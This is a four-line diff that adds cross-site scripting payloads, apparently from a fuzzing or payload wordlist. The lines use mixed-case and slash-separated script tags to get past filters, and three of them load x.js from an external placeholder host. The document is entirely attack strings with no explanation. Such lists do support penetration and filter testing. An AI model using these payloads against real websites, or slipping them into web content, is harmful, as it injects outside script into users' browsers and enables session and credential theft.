@@ -1,0 +1,4 @@
+<ScRIPT>a=/RANDOMIZE/
+<ScRIPt SrC=http://RANDOMIZE/x.js></ScRIPt>
+<ScRIPt/XSS SrC=http://RANDOMIZE/x.js></ScRIPt>
+<ScRIPt/SrC=http://RANDOMIZE/x.js></ScRIPt>
